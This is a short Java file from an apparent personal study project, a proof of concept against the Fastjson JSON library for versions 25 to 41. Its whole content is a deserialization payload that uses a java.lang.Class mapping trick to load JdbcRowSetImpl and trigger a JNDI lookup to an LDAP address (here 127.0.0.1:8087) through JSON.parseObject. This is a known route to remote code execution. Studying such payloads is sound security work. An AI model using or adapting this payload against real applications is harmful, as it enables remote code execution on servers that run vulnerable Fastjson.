package Fastjson.version25to41;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Fastjson.version25to41
 * @Author: Clown
 * @CreateTime: 2023-10-13  20:58
 */
public class poc25to41mappings {
    public static void main(String[] args) {
        String str = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}}";
        JSON.parseObject(str);
    }
}